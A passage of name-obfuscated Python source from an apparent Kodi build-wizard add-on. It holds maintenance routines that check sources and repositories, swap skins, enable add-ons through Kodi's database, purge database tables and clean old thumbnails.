                    O00OOO000OO00O000 .append ([OOOO0OO00OO0OOO00 ,O0OOO0OO0000OO00O ,OO0O00OO0000OOOO0 ,OO00O00O0OO000O0O ])#line:3510
        log ("Bad Sources: %s"%len (O00OOO000OO00O000 ),5 )#line:3512
        if len (O00OOO000OO00O000 )>0 :#line:3513
            O00OOOOOO0O000O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] Source(s) have been found Broken"%(COLOR1 ,len (O00OOO000OO00O000 ),COLOR2 ),"Would you like to Remove all or choose one by one?[/COLOR]",yeslabel ="[B][COLOR green]Remove All[/COLOR][/B]",nolabel ="[B][COLOR red]Choose to Delete[/COLOR][/B]")#line:3514
            if O00OOOOOO0O000O00 ==1 :#line:3515
                OOOOOO00O00O0000O =O00OOO000OO00O000 #line:3516
            else :#line:3517
                for OOOO0OO00OO0OOO00 ,O0OOO0OO0000OO00O ,OO0O00OO0000OOOO0 ,OO00O00O0OO000O0O in O00OOO000OO00O000 :#line:3518
                    log ("%s sources: %s, %s"%(OOOO0OO00OO0OOO00 ,O0OOO0OO0000OO00O ,OO00O00O0OO000O0O ),5 )#line:3519
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] was reported as non working"%(COLOR1 ,OOOO0OO00OO0OOO00 ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OO0000OO00O ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O00O0OO000O0O ),yeslabel ="[B][COLOR green]Remove Source[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Source[/COLOR][/B]"):#line:3520
                        OOOOOO00O00O0000O .append ([OOOO0OO00OO0OOO00 ,O0OOO0OO0000OO00O ,OO0O00OO0000OOOO0 ,OO00O00O0OO000O0O ])#line:3521
                        log ("Removing Source %s"%OOOO0OO00OO0OOO00 ,5 )#line:3522
                    else :log ("Source %s was not removed"%OOOO0OO00OO0OOO00 ,5 )#line:3523
            if len (OOOOOO00O00O0000O )>0 :#line:3524
                for OOOO0OO00OO0OOO00 ,O0OOO0OO0000OO00O ,OO0O00OO0000OOOO0 ,OO00O00O0OO000O0O in OOOOOO00O00O0000O :#line:3525
                    O0O00O0000OOO0O0O =O0O00O0000OOO0O0O .replace ('\n        <source>\n            <name>%s</name>\n            <path pathversion="1">%s</path>\n            <allowsharing>%s</allowsharing>\n        </source>'%(OOOO0OO00OO0OOO00 ,O0OOO0OO0000OO00O ,OO0O00OO0000OOOO0 ),'')#line:3526
                    log ("Removing Source %s"%OOOO0OO00OO0OOO00 ,5 )#line:3527
                O0OO0000000O000OO =open (SOURCES ,mode ='w')#line:3529
                O0OO0000000O000OO .write (str (O0O00O0000OOO0O0O ))#line:3530
                O0OO0000000O000OO .close ()#line:3531
                OO00OO0O00O0O000O =len (OOO00000OO00OOO0O )-len (O00OOO000OO00O000 )#line:3532
                OO00OOO00O0000OOO =len (O00OOO000OO00O000 )-len (OOOOOO00O00O0000O )#line:3533
                O00OOOO0O0O00OOO0 =len (OOOOOO00O00O0000O )#line:3534
                DIALOG .ok (ADDONTITLE ,"[COLOR %s]Checking sources for broken paths has been completed"%COLOR2 ,"Working: [COLOR %s]%s[/COLOR] | Kept: [COLOR %s]%s[/COLOR] | Removed: [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR2 ,COLOR1 ,OO00OO0O00O0O000O ,COLOR1 ,OO00OOO00O0000OOO ,COLOR1 ,O00OOOO0O0O00OOO0 ))#line:3535
            else :log ("No Bad Sources to be removed.",5 )#line:3536
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Sources Are Working[/COLOR]"%COLOR2 )#line:3537
    else :log ("No Sources Found",5 )#line:3538
def checkRepos ():#line:3540
    DP .create (ADDONTITLE ,'[COLOR %s]Checking Repositories...[/COLOR]'%COLOR2 )#line:3541
    O0000OOOOOOO0OO0O =[]#line:3542
    ebi ('UpdateAddonRepos')#line:3543
    O0OO0O0OO0OOO0O00 =glob .glob (os .path .join (ADDONS ,'repo*'))#line:3544
    if len (O0OO0O0OO0OOO0O00 )==0 :#line:3545
        DP .close ()#line:3546
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Repositories Found![/COLOR]"%COLOR2 )#line:3547
        return #line:3548
    OO0O0OOOOO0OOOOO0 =len (O0OO0O0OO0OOO0O00 );O0O00O00O000000OO =0 ;#line:3549
    while O0O00O00O000000OO <OO0O0OOOOO0OOOOO0 :#line:3550
        O0O00O00O000000OO +=1 #line:3551
        if DP .iscanceled ():break #line:3552
        O0OO0OOOO00OO0000 =int (percentage (O0O00O00O000000OO ,OO0O0OOOOO0OOOOO0 ))#line:3553
        DP .update (O0OO0OOOO00OO0000 ,'','[COLOR %s]Checking: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O0OO0OOO0O00 [O0O00O00O000000OO -1 ].replace (ADDONS ,'')[1 :]))#line:3554
        xbmc .sleep (1000 )#line:3555
    if DP .iscanceled ():#line:3556
        DP .close ()#line:3557
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled[/COLOR]"%COLOR2 )#line:3558
        sys .exit ()#line:3559
    DP .close ()#line:3560
    O00O0OOOO0OO000OO =Grab_Log (False )#line:3561
    OO0O0OO000OOO0OO0 =re .compile ('CRepositoryUpdateJob(.+?)failed').findall (O00O0OOOO0OO000OO )#line:3562
    for OOOO0OO00000OO000 in OO0O0OO000OOO0OO0 :#line:3563
        log ("Bad Repository: %s "%OOOO0OO00000OO000 ,5 )#line:3564
        O00O0O00O0O00OO0O =OOOO0OO00000OO000 .replace ('[','').replace (']','').replace (' ','').replace ('/','').replace ('\\','')#line:3565
        if not O00O0O00O0O00OO0O in O0000OOOOOOO0OO0O :#line:3566
            O0000OOOOOOO0OO0O .append (O00O0O00O0O00OO0O )#line:3567
    if len (O0000OOOOOOO0OO0O )>0 :#line:3568
        OOO0OO0OO0O00O0O0 ="[COLOR %s]Below is a list of Repositories that did not resolve.  This does not mean that they are Depreciated, sometimes hosts go down for a short period of time.  Please do serveral scans of your repository list before removing a repository just to make sure it is broken.[/COLOR][CR][CR][COLOR %s]"%(COLOR2 ,COLOR1 )#line:3569
        OOO0OO0OO0O00O0O0 +='[CR]'.join (O0000OOOOOOO0OO0O )#line:3570
        OOO0OO0OO0O00O0O0 +='[/COLOR]'#line:3571
        TextBox ("%s: Bad Repositories"%ADDONTITLE ,OOO0OO0OO0O00O0O0 )#line:3572
    else :#line:3573
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Repositories Working![/COLOR]"%COLOR2 )#line:3574
def killxbmc (over =None ):#line:3580
        log ("Force Closing Kodi: Platform[%s]"%str (platform_d ()),5 )#line:3581
        os ._exit (1 )#line:3582
def redoThumbs ():#line:3584
    if not os .path .exists (THUMBS ):os .makedirs (THUMBS )#line:3585
    O0O0000O000OO000O ='0123456789abcdef'#line:3586
    O00O00000O00000OO =os .path .join (THUMBS ,'Video','Bookmarks')#line:3587
    for O0O0OOO0O0O0000OO in O0O0000O000OO000O :#line:3588
        OOOOO0O0000OO0OO0 =os .path .join (THUMBS ,O0O0OOO0O0O0000OO )#line:3589
        if not os .path .exists (OOOOO0O0000OO0OO0 ):os .makedirs (OOOOO0O0000OO0OO0 )#line:3590
    if not os .path .exists (O00O00000O00000OO ):os .makedirs (O00O00000O00000OO )#line:3591
def reloadFix (default =None ):#line:3593
    DIALOG .ok (ADDONTITLE ,"[COLOR %s]WARNING: Sometimes Reloading the Profile causes Kodi to crash.  While Kodi is Reloading the Profile Please Do Not Press Any Buttons![/COLOR]"%COLOR2 )#line:3594
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3595
    if default ==None :#line:3596
        lookandFeelData ('save')#line:3597
    redoThumbs ()#line:3598
    ebi ('ActivateWindow(Home)')#line:3599
    xbmc .sleep (10000 )#line:3601
    if KODIV >=17 :kodi17Fix ()#line:3602
    if default ==None :#line:3603
        log ("Switching to: %s"%getS ('defaultskin'))#line:3604
        OO0OOO00OO0OO0O00 =getS ('defaultskin')#line:3605
        skinSwitch .swapSkins (OO0OOO00OO0OO0O00 )#line:3606
        OOOOOO0O00OOO00OO =0 #line:3607
        while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOOO0O00OOO00OO <150 :#line:3608
            OOOOOO0O00OOO00OO +=1 #line:3609
            xbmc .sleep (200 )#line:3610
        if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3611
            ebi ('SendClick(11)')#line:3612
        lookandFeelData ('restore')#line:3613
    addonUpdates ('reset')#line:3614
    forceUpdate ()#line:3615
    ebi ("ReloadSkin()")#line:3616
def skinToDefault ():#line:3618
    if not currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:3619
        O000O00O0O00O0O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'#line:3620
    swapSkins (O000O00O0O00O0O0O )#line:3621
def swapSkins (O0OO0OO00O00OO000 ):#line:3623
    skinSwitch .swapSkins (O0OO0OO00O00OO000 )#line:3624
    OO00O00OO0O00O000 =0 #line:3625
    xbmc .sleep (1000 )#line:3626
    while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00O00OO0O00O000 <150 :#line:3627
        OO00O00OO0O00O000 +=1 #line:3628
        xbmc .sleep (100 )#line:3629
        ebi ('SendAction(Select)')#line:3630
    if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3632
        ebi ('SendClick(11)')#line:3633
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Fresh Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:3634
    xbmc .sleep (500 )#line:3635
def mediaCenter ():#line:3637
    if str (HOME ).lower ().find ('kodi'):#line:3638
        return 'Kodi'#line:3639
    elif str (HOME ).lower ().find ('spmc'):#line:3640
        return 'SPMC'#line:3641
    else :#line:3642
        return 'Unknown Fork'#line:3643
def kodi17Fix ():#line:3645
    O00000OO00OO00OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3646
    OO0OO0OO00OO0O000 =[]#line:3647
    for O0O0OO00O00OOO0OO in sorted (O00000OO00OO00OO0 ,key =lambda OO0000O00OOO00O00 :OO0000O00OOO00O00 ):#line:3648
        O00O000000O0O00OO =os .path .join (O0O0OO00O00OOO0OO ,'addon.xml')#line:3649
        if os .path .exists (O00O000000O0O00OO ):#line:3650
            OO000OO00OOOOOOOO =O0O0OO00O00OOO0OO .replace (ADDONS ,'')[1 :-1 ]#line:3651
            try :#line:3652
                O0000OOO0O0O0O0O0 =open (O00O000000O0O00OO )#line:3653
                OO00000000O0OO00O =O0000OOO0O0O0O0O0 .read ()#line:3654
                O0O0OO0O0000OOO00 =parseDOM (OO00000000O0OO00O ,'addon',ret ='id')#line:3655
                O0000OOO0O0O0O0O0 .close ()#line:3656
            except :#line:3657
                O0000OOO0O0O0O0O0 =open (O00O000000O0O00OO ,encoding ='utf-8')#line:3658
                OO00000000O0OO00O =O0000OOO0O0O0O0O0 .read ()#line:3659
                O0O0OO0O0000OOO00 =parseDOM (OO00000000O0OO00O ,'addon',ret ='id')#line:3660
                O0000OOO0O0O0O0O0 .close ()#line:3661
            try :#line:3662
                O0OOO0OO0O00OO000 =xbmcaddon .Addon (id =O0O0OO0O0000OOO00 [0 ])#line:3663
            except :#line:3664
                try :#line:3665
                    OO0OO0OO00OO0O000 .append (O0O0OO0O0000OOO00 [0 ])#line:3667
                except :#line:3668
                    try :#line:3669
                        OO0OO0OO00OO0O000 .append (OO000OO00OOOOOOOO )#line:3671
                    except :#line:3672
                        if len (O0O0OO0O0000OOO00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO000OO00OOOOOOOO ,5 )#line:3673
                        else :log ("Unabled to enable: %s"%O0O0OO00O00OOO0OO ,5 )#line:3674
    if len (OO0OO0OO00OO0O000 )>0 :#line:3675
        O0OOO00OO00000000 =0 #line:3676
        if not BUILDNAME =="":#line:3677
            DP .create (ADDONTITLE ,'[COLOR %s]מעדכן הרחבות'%COLOR2 +'\n'+''+'\n'+'אנא המתן[/COLOR]')#line:3679
            for OOOOOOOOOO0OO0O00 in OO0OO0OO00OO0O000 :#line:3681
                if 'service.xbmc.versioncheck'in OOOOOOOOOO0OO0O00 :#line:3682
                   continue #line:3683
                if 'metadata.themoviedb.org.python'in OOOOOOOOOO0OO0O00 :#line:3684
                   continue #line:3685
                if 'metadata.tvshows.themoviedb.org.python'in OOOOOOOOOO0OO0O00 :#line:3686
                   continue #line:3687
                if 'game.controller.default'in OOOOOOOOOO0OO0O00 :#line:3688
                   continue #line:3689
                if 'game.controller.snes'in OOOOOOOOOO0OO0O00 :#line:3690
                   continue #line:3691
                if 'metadata.album.universal'in OOOOOOOOOO0OO0O00 :#line:3692
                   continue #line:3693
                if 'metadata.artists.universal'in OOOOOOOOOO0OO0O00 :#line:3694
                   continue #line:3695
                if 'metadata.common.imdb.com'in OOOOOOOOOO0OO0O00 :#line:3696
                   continue #line:3697
                if 'metadata.common.themoviedb.org'in OOOOOOOOOO0OO0O00 :#line:3698
                   continue #line:3699
                if 'metadata.tvshows.themoviedb.org'in OOOOOOOOOO0OO0O00 :#line:3700
                   continue #line:3701
                O0OOO00OO00000000 +=1 #line:3702
                O00O00OOO0O0OOO0O =int (percentage (O0OOO00OO00000000 ,len (OO0OO0OO00OO0O000 )))#line:3703
                try :#line:3704
                   DP .update (O00O00OOO0O0OOO0O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOOOO0OO0O00 ))#line:3705
                except :#line:3706
                   DP .update (O00O00OOO0O0OOO0O ,"Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOOOO0OO0O00 ))#line:3707
                addonDatabase (OOOOOOOOOO0OO0O00 ,1 )#line:3708
                if DP .iscanceled ():break #line:3709
            if DP .iscanceled ():#line:3710
                DP .close ()#line:3711
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3712
                sys .exit ()#line:3713
            DP .close ()#line:3714
        else :#line:3715
          for OOOOOOOOOO0OO0O00 in OO0OO0OO00OO0O000 :#line:3716
            if 'service.xbmc.versioncheck'in OOOOOOOOOO0OO0O00 :#line:3717
               continue #line:3718
            if 'metadata.themoviedb.org.python'in OOOOOOOOOO0OO0O00 :#line:3719
               continue #line:3720
            if 'metadata.tvshows.themoviedb.org.python'in OOOOOOOOOO0OO0O00 :#line:3721
               continue #line:3722
            if 'game.controller.default'in OOOOOOOOOO0OO0O00 :#line:3723
               continue #line:3724
            if 'game.controller.snes'in OOOOOOOOOO0OO0O00 :#line:3725
               continue #line:3726
            if 'metadata.album.universal'in OOOOOOOOOO0OO0O00 :#line:3727
               continue #line:3728
            if 'metadata.artists.universal'in OOOOOOOOOO0OO0O00 :#line:3729
               continue #line:3730
            if 'metadata.common.imdb.com'in OOOOOOOOOO0OO0O00 :#line:3731
               continue #line:3732
            if 'metadata.common.themoviedb.org'in OOOOOOOOOO0OO0O00 :#line:3733
               continue #line:3734
            if 'metadata.tvshows.themoviedb.org'in OOOOOOOOOO0OO0O00 :#line:3735
               continue #line:3736
            addonDatabase (OOOOOOOOOO0OO0O00 ,1 )#line:3738
    forceUpdate ()#line:3739
def addonDatabase (addon =None ,state =1 ):#line:3742
    O0OOO0000O0O0OOO0 =latestDB ('Addons')#line:3743
    O0OOO0000O0O0OOO0 =os .path .join (DATABASE ,O0OOO0000O0O0OOO0 )#line:3744
    O00000000000OOO00 =str (datetime .now ())[:-7 ]#line:3745
    if os .path .exists (O0OOO0000O0O0OOO0 ):#line:3746
        try :#line:3747
            O0O0OOOO00OO00O0O =database .connect (O0OOO0000O0O0OOO0 )#line:3748
            O00OOOO00O00OOOOO =O0O0OOOO00OO00O0O .cursor ()#line:3749
        except Exception as O000OO00OO0OOO00O :#line:3750
            log ("DB Connection Error: %s"%str (O000OO00OO0OOO00O ),5 )#line:3751
            return False #line:3752
    else :return False #line:3753
    if state ==2 :#line:3754
        try :#line:3755
            O00OOOO00O00OOOOO .execute ("DELETE FROM installed WHERE addonID = ?",(addon ,))#line:3756
            O0O0OOOO00OO00O0O .commit ()#line:3757
            O00OOOO00O00OOOOO .close ()#line:3758
        except Exception as O000OO00OO0OOO00O :#line:3759
            log ("Error Removing %s from DB"%addon )#line:3760
        return True #line:3761
    try :#line:3762
        O00OOOO00O00OOOOO .execute ("SELECT id, addonID, enabled FROM installed WHERE addonID = ?",(addon ,))#line:3763
        OOO00000OO00O0O00 =O00OOOO00O00OOOOO .fetchone ()#line:3764
        if OOO00000OO00O0O00 ==None :#line:3765
            O00OOOO00O00OOOOO .execute ('INSERT INTO installed (addonID , enabled, installDate) VALUES (?,?,?)',(addon ,state ,O00000000000OOO00 ,))#line:3766
            log ("Insert %s into db"%addon )#line:3767
        else :#line:3768
            O0O00OO0O00O0OOO0 ,O00OO000000000O0O ,OOOOOO000OO00O00O =OOO00000OO00O0O00 #line:3769
            O00OOOO00O00OOOOO .execute ('UPDATE installed SET enabled = ? WHERE id = ? ',(state ,O0O00OO0O00O0OOO0 ,))#line:3770
            log ("Updated %s in db"%addon )#line:3771
        O0O0OOOO00OO00O0O .commit ()#line:3772
        O00OOOO00O00OOOOO .close ()#line:3773
    except Exception as O000OO00OO0OOO00O :#line:3774
        log ("Erroring enabling addon: %s"%addon )#line:3775
def purgeDb (O0O0OO0OOO0OOO0O0 ):#line:3780
    log ('Purging DB %s.'%O0O0OO0OOO0OOO0O0 ,5 )#line:3784
    if os .path .exists (O0O0OO0OOO0OOO0O0 ):#line:3785
        try :#line:3786
            OOOOOOOOO00OOOO00 =database .connect (O0O0OO0OOO0OOO0O0 )#line:3787
            O0O0O0OO0OOO00O0O =OOOOOOOOO00OOOO00 .cursor ()#line:3788
        except Exception as OO0OOOOOOO00O0O0O :#line:3789
            log ("DB Connection Error: %s"%str (OO0OOOOOOO00O0O0O ),5 )#line:3790
            return False #line:3791
    else :log ('%s not found.'%O0O0OO0OOO0OOO0O0 ,5 );return False #line:3792
    O0O0O0OO0OOO00O0O .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:3793
    for O00000OO000OO00OO in O0O0O0OO0OOO00O0O .fetchall ():#line:3794
        if O00000OO000OO00OO [0 ]=='version':#line:3795
            log ('Data from table `%s` skipped.'%O00000OO000OO00OO [0 ],5 )#line:3796
        else :#line:3797
            try :#line:3798
                O0O0O0OO0OOO00O0O .execute ("DELETE FROM %s"%O00000OO000OO00OO [0 ])#line:3799
                OOOOOOOOO00OOOO00 .commit ()#line:3800
                log ('Data from table `%s` cleared.'%O00000OO000OO00OO [0 ],5 )#line:3801
            except Exception as OO0OOOOOOO00O0O0O :log ("DB Remove Table `%s` Error: %s"%(O00000OO000OO00OO [0 ],str (OO0OOOOOOO00O0O0O )),5 )#line:3802
    O0O0O0OO0OOO00O0O .close ()#line:3803
    log ('%s DB Purging Complete.'%O0O0OO0OOO0OOO0O0 ,5 )#line:3804
    O0O00OOOOOO0O0000 =O0O0OO0OOO0OOO0O0 .replace ('\\','/').split ('/')#line:3805
    LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]%s Complete[/COLOR]"%(COLOR2 ,O0O00OOOOOO0O0000 [len (O0O00OOOOOO0O0000 )-1 ]))#line:3806
def oldThumbs ():#line:3808
    O00O0O0000OOOOO00 =os .path .join (DATABASE ,latestDB ('Textures'))#line:3809
    OO0OO0OOOO000O000 =10 #line:3810
    OO0OOOO0O0OOOOO0O =TODAY -timedelta (days =7 )#line:3811
    OOOO0OOO0O00OO000 =[]#line:3812
    O0OO0OOOOOOOO0OOO =[]#line:3813
    O0O0O0O000O00OO0O =0 #line:3814
    if os .path .exists (O00O0O0000OOOOO00 ):#line:3815
        try :#line:3816
            OOO0O0OO00O0O00OO =database .connect (O00O0O0000OOOOO00 )#line:3817
            OOO00OO0000O0OO0O =OOO0O0OO00O0O00OO .cursor ()#line:3818
        except Exception as OO0O000OO00OOOO00 :#line:3819
            log ("DB Connection Error: %s"%str (OO0O000OO00OOOO00 ),5 )#line:3820
            return False #line:3821
    else :log ('%s not found.'%O00O0O0000OOOOO00 ,5 );return False #line:3822
    OOO00OO0000O0OO0O .execute ("SELECT idtexture FROM sizes WHERE usecount < ? AND lastusetime < ?",(OO0OO0OOOO000O000 ,str (OO0OOOO0O0OOOOO0O )))#line:3823
    OOO0OOO0OOOO0O000 =OOO00OO0000O0OO0O .fetchall ()#line:3824
    for OO00O00OOO0000O0O in OOO0OOO0OOOO0O000 :#line:3825
        O0O0O0O0OOO000000 =OO00O00OOO0000O0O [0 ]#line:3826
        OOOO0OOO0O00OO000 .append (O0O0O0O0OOO000000 )#line:3827
        OOO00OO0000O0OO0O .execute ("SELECT cachedurl FROM texture WHERE id = ?",(O0O0O0O0OOO000000 ,))#line:3828
        OO0O0OOO0OOOOOO0O =OOO00OO0000O0OO0O .fetchall ()#line:3829
        for OOOOOO00OO0OOO0O0 in OO0O0OOO0OOOOOO0O :#line:3830
            O0OO0OOOOOOOO0OOO .append (OOOOOO00OO0OOO0O0 [0 ])#line:3831
    log ("%s total thumbs cleaned up."%str (len (O0OO0OOOOOOOO0OOO )),5 )#line:3832
    for OO0O0OO0OO00O0O00 in OOOO0OOO0O00OO000 :#line:3833
        OOO00OO0000O0OO0O .execute ("DELETE FROM sizes   WHERE idtexture = ?",(OO0O0OO0OO00O0O00 ,))#line:3834
        OOO00OO0000O0OO0O .execute ("DELETE FROM texture WHERE id        = ?",(OO0O0OO0OO00O0O00 ,))#line:3835
    OOO00OO0000O0OO0O .execute ("VACUUM")#line:3836
    OOO0O0OO00O0O00OO .commit ()#line:3837
    OOO00OO0000O0OO0O .close ()#line:3838
    for O000OO00OOO0O0OOO in O0OO0OOOOOOOO0OOO :#line:3839
        O00O0OO0OO0000O00 =os .path .join (THUMBS ,O000OO00OOO0O0OOO )#line:3840
        try :#line:3841
            O00000OO0O0OO00OO =os .path .getsize (O00O0OO0OO0000O00 )#line:3842
            os .remove (O00O0OO0OO0000O00 )#line:3843
            O0O0O0O000O00OO0O +=O00000OO0O0OO00OO #line:3844
        except :#line:3845
            pass #line:3846
    O0O0OO00OO0OOO0O0 =convertSize (O0O0O0O000O00OO0O )#line:3847
    if len (O0OO0OOOOOOOO0OOO )>0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: %s Files / %s MB[/COLOR]!'%(COLOR2 ,str (len (O0OO0OOOOOOOO0OOO )),O0O0OO00OO0OOO0O0 ))#line:3848
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: None Found![/COLOR]'%COLOR2 )#line:3849
def parseDOM (O000O000000O0000O ,name =u"",attrs ={},ret =False ):#line:3851
    if isinstance (O000O000000O0000O ,str ):#line:3854
        try :#line:3855
            O000O000000O0000O =[O000O000000O0000O .decode ("utf-8")]#line:3856
        except :#line:3857
            O000O000000O0000O =[O000O000000O0000O ]#line:3858
    elif isinstance (O000O000000O0000O ,unicode ):#line:3859
        O000O000000O0000O =[O000O000000O0000O ]#line:3860
    elif not isinstance (O000O000000O0000O ,list ):#line:3861
        return u""#line:3862
    if not name .strip ():#line:3864
        return u""#line:3865
    O00000OOO0OO0O000 =[]#line:3867
    for OOO00OOOO0OO0OOOO in O000O000000O0000O :#line:3868
        O0OOOO0O0O00OOOO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO00OOOO0OO0OOOO )#line:3869
        for O0OO00OOOO00O00O0 in O0OOOO0O0O00OOOO0 :#line:3870
            OOO00OOOO0OO0OOOO =OOO00OOOO0OO0OOOO .replace (O0OO00OOOO00O00O0 ,O0OO00OOOO00O00O0 .replace ("\n"," "))#line:3871
        O0OOOOOO0O00O0000 =[]#line:3873
        for OOO0OOOO0OO00OOO0 in attrs :#line:3874
            O00000O00000O00OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0OOOO0OO00OOO0 +'=[\'"]'+attrs [OOO0OOOO0OO00OOO0 ]+'[\'"].*?>))',re .M |re .S ).findall (OOO00OOOO0OO0OOOO )#line:3875
            if len (O00000O00000O00OO )==0 and attrs [OOO0OOOO0OO00OOO0 ].find (" ")==-1 :#line:3876
                O00000O00000O00OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0OOOO0OO00OOO0 +'='+attrs [OOO0OOOO0OO00OOO0 ]+'.*?>))',re .M |re .S ).findall (OOO00OOOO0OO0OOOO )#line:3877
            if len (O0OOOOOO0O00O0000 )==0 :#line:3879
                O0OOOOOO0O00O0000 =O00000O00000O00OO #line:3880
                O00000O00000O00OO =[]#line:3881
            else :#line:3882
                OO0O0O0000O00O0O0 =range (len (O0OOOOOO0O00O0000 ))#line:3883
                OO0O0O0000O00O0O0 .reverse ()#line:3884
                for OO0O000O0OO0O0O0O in OO0O0O0000O00O0O0 :#line:3885
                    if not O0OOOOOO0O00O0000 [OO0O000O0OO0O0O0O ]in O00000O00000O00OO :#line:3886
                        del (O0OOOOOO0O00O0000 [OO0O000O0OO0O0O0O ])#line:3887
        if len (O0OOOOOO0O00O0000 )==0 and attrs =={}:#line:3889
            O0OOOOOO0O00O0000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO00OOOO0OO0OOOO )#line:3890
            if len (O0OOOOOO0O00O0000 )==0 :#line:3891
                O0OOOOOO0O00O0000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO00OOOO0OO0OOOO )#line:3892
        if isinstance (ret ,str ):#line:3894
            O00000O00000O00OO =[]#line:3895
            for O0OO00OOOO00O00O0 in O0OOOOOO0O00O0000 :#line:3896
                OO0O0O0O00O0OO000 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0OO00OOOO00O00O0 )#line:3897
                if len (OO0O0O0O00O0OO000 )==0 :#line:3898
                    OO0O0O0O00O0OO000 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0OO00OOOO00O00O0 )#line:3899
                for O0OOO0O0OO0O0OO00 in OO0O0O0O00O0OO000 :#line:3900
                    O0O00OOOOOO0000O0 =O0OOO0O0OO0O0OO00 [0 ]#line:3901
                    if O0O00OOOOOO0000O0 in "'\"":#line:3902
                        if O0OOO0O0OO0O0OO00 .find ('='+O0O00OOOOOO0000O0 ,O0OOO0O0OO0O0OO00 .find (O0O00OOOOOO0000O0 ,1 ))>-1 :#line:3903
                            O0OOO0O0OO0O0OO00 =O0OOO0O0OO0O0OO00 [:O0OOO0O0OO0O0OO00 .find ('='+O0O00OOOOOO0000O0 ,O0OOO0O0OO0O0OO00 .find (O0O00OOOOOO0000O0 ,1 ))]#line:3904
                        if O0OOO0O0OO0O0OO00 .rfind (O0O00OOOOOO0000O0 ,1 )>-1 :#line:3906
                            O0OOO0O0OO0O0OO00 =O0OOO0O0OO0O0OO00 [1 :O0OOO0O0OO0O0OO00 .rfind (O0O00OOOOOO0000O0 )]#line:3907
                    else :#line:3908
                        if O0OOO0O0OO0O0OO00 .find (" ")>0 :#line:3909
                            O0OOO0O0OO0O0OO00 =O0OOO0O0OO0O0OO00 [:O0OOO0O0OO0O0OO00 .find (" ")]#line:3910
                        elif O0OOO0O0OO0O0OO00 .find ("/")>0 :#line:3911
                            O0OOO0O0OO0O0OO00 =O0OOO0O0OO0O0OO00 [:O0OOO0O0OO0O0OO00 .find ("/")]#line:3912
                        elif O0OOO0O0OO0O0OO00 .find (">")>0 :#line:3913
                            O0OOO0O0OO0O0OO00 =O0OOO0O0OO0O0OO00 [:O0OOO0O0OO0O0OO00 .find (">")]#line:3914
                    O00000O00000O00OO .append (O0OOO0O0OO0O0OO00 .strip ())#line:3916
            O0OOOOOO0O00O0000 =O00000O00000O00OO #line:3917
        else :#line:3918
            O00000O00000O00OO =[]#line:3919
            for O0OO00OOOO00O00O0 in O0OOOOOO0O00O0000 :#line:3920
                OOOO000O00OOO00OO =u"</"+name #line:3921
                O00OOO00O0OOOOOO0 =OOO00OOOO0OO0OOOO .find (O0OO00OOOO00O00O0 )#line:3923
                OO000OO0O0OOO00O0 =OOO00OOOO0OO0OOOO .find (OOOO000O00OOO00OO ,O00OOO00O0OOOOOO0 )#line:3924
                OOO0OOO000O00O00O =OOO00OOOO0OO0OOOO .find ("<"+name ,O00OOO00O0OOOOOO0 +1 )#line:3925
                while OOO0OOO000O00O00O <OO000OO0O0OOO00O0 and OOO0OOO000O00O00O !=-1 :#line:3927
                    O0000O00OO000000O =OOO00OOOO0OO0OOOO .find (OOOO000O00OOO00OO ,OO000OO0O0OOO00O0 +len (OOOO000O00OOO00OO ))#line:3928
                    if O0000O00OO000000O !=-1 :#line:3929
                        OO000OO0O0OOO00O0 =O0000O00OO000000O #line:3930
                    OOO0OOO000O00O00O =OOO00OOOO0OO0OOOO .find ("<"+name ,OOO0OOO000O00O00O +1 )#line:3931
                if O00OOO00O0OOOOOO0 ==-1 and OO000OO0O0OOO00O0 ==-1 :#line:3933
                    OO0O00OOOO0OOO000 =u""#line:3934
                elif O00OOO00O0OOOOOO0 >-1 and OO000OO0O0OOO00O0 >-1 :#line:3935
